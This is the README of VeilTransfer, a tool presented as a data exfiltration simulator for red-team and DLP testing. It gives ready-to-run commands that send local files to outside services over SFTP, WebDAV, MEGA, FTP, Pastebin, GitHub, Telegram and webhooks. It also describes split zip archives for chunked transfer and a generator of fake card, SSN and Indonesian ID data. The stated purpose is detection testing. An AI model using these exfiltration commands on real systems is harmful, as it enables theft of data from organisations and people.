# VeilTransfer

VeilTransfer is a data exfiltration utility designed to test and enhance the detection capabilities. This tool simulates real-world data exfiltration techniques used by advanced threat actors, allowing organizations to evaluate and improve their security posture. By leveraging multiple exfiltration methods such as MEGA, Github, SFTP, WebDAV, and more, VeilTransfer helps identify gaps in your defenses and ensures your security solutions are prepared to counter modern data breaches.

## Supported Exfiltration Methods

- MEGA 
- Github
- Telegram
- Pastebin
- WebDAV
- Webhook
- SFTP
- FTP

## Additional Features

### Fake Data Generation
VeilTransfer also supports generating fake data, including:

- **Indonesia Identity Card (KTP) Numbers:** Generate realistic KTP numbers and associated data.
- **Credit Card Information:** Create fake credit card details in PCI DSS format, including First Name, Last Name, CCN (Visa/MasterCard/AMEX), and Expiration Date.
- **Social Security Numbers (SSN):** Generate fake SSNs for use in simulations and testing environments.

### Zip Data Creation
Easily create zip files for bundling and compressing data, which can then be used for exfiltration or testing different scenarios.

## Example Use Cases
* Red Team Operations: Deploy VeilTransfer during red team exercises to challenge blue teams with sophisticated and realistic exfiltration scenarios.
* Purple Teaming: Collaborate with your defensive teams to simulate and then detect exfiltration attempts, refining both offensive and defensive tactics.
* Security Testing: Use VeilTransfer to validate the effectiveness of Data Loss Prevention (DLP) solutions, firewalls, and other network security measures.


## Example Usage

### Transfer

#### Transfer a File via SFTP
This example demonstrates how to securely transfer a file to a remote server using the SFTP protocol. The file is located on the local machine, and it's transferred to the specified remote directory using SSH authentication.
```
VeilTransfer transfer -method sftp -localPath (/path/to/file or /path/to/directory) -remoteDir /remote/path -server example.com:22 -username user -password pass
```

#### Transfer Files to a WebDAV Server
In this example, files from a local directory are uploaded to a WebDAV server. The server requires a username and password for authentication. The server parameter includes the URI scheme (https:// or http://).
```
VeilTransfer transfer -method webdav -localPath /path/to/directory -remoteDir /remote/path -server http://webdav.example.com:8080 -username user -password pass
```

#### Transfer Files to Mega Cloud
This example shows how to transfer files to Mega Cloud storage. The files are uploaded from a specified local directory, and the authentication is handled using the user's Mega Cloud credentials.
```
VeilTransfer transfer -method mega -localPath (/path/to/file or /path/to/directory) -username megauser@example.com -password megasecretpassword
```

#### Transfer Files via FTP
In this example, a file is uploaded to an FTP server. The file is transferred to a specific directory on the remote server. The server requires a username and password for authentication.
```
VeilTransfer transfer -method ftp -localPath (/path/to/file or /path/to/directory) -remoteDir remote/path -server ftp.example.com:21 -username ftpuser -password ftppassword
```

#### Upload a File to Pastebin
This example demonstrates how to upload the contents of a file to Pastebin. The content is posted to Pastebin using an API key provided by the user.
```
VeilTransfer transfer -method pastebin -localPath (/path/to/file or /path/to/directory) -apiKey your_pastebin_api_key
```

#### Send a File to a Github Repository
This example shows how to push a file from the local machine to a specific GitHub repository. The file is added to the repository using the user's GitHub API token for authentication.
```
VeilTransfer transfer -method github -localPath (/path/to/file or /path/to/directory) -repo yourusername/repository -apiKey your_github_api_token
```

#### Send a File to a Telegram Channel
This example demonstrates how to send a file to a specific Telegram channel. The file is sent using a Telegram bot API token, and the message is delivered to the specified channel ID.
```
VeilTransfer transfer -method telegram -localPath (/path/to/file or /path/to/directory) -telegramAPI your_telegram_bot_api_token -channelID 123456789
```

#### Send Data to a Webhook URL
In this example, the contents of a file are sent to a specified Webhook URL.
```
VeilTransfer transfer -method webhook -localPath (/path/to/file or /path/to/directory) -webhookURL https://webhook.site/your-webhook-url
```

### Create Zip Files

#### Create a Simple Zip File
This example shows how to create a zip file from a specified directory. The output is a single zip file containing all the files from the directory.
```
VeilTransfer create-zip -localPath /path/to/directory -outputPath /path/to/output.zip
```

#### Create a Split Zip File
This example demonstrates how to create a zip file that is split into multiple parts, with each part being no larger than the specified size. This is useful for transferring large files in smaller chunks.
```
VeilTransfer create-zip -localPath /path/to/directory -outputPath /path/to/output.zip -splitSize 1000000
```

### Data Generator 

#### Generate 100 Fake Credit Card Numbers
This example shows how to generate 100 entries of fake credit card data. The generated data will include credit card numbers, expiration dates, and associated details.
```
VeilTransfer generate-fake -ccn -count 100
```

#### Generate 50 Fake Indonesian KTP Entries
This example demonstrates how to generate 50 entries of fake KTP data, which are Indonesian identity cards. The data includes personal information such as name, address, and KTP number.
```
VeilTransfer generate-fake -ktp -count 50
```

#### Generate 200 Fake Social Security Numbers
This example shows how to generate 200 entries of fake SSN data. This is useful for applications requiring large datasets of U.S. Social Security Numbers.
```
VeilTransfer generate-fake -ssn -count 200
```

## Contributing
Contributions to VeilTransfer are welcome! If you have ideas for new features, exfiltration methods, or improvements, please submit a pull request or open an issue on GitHub.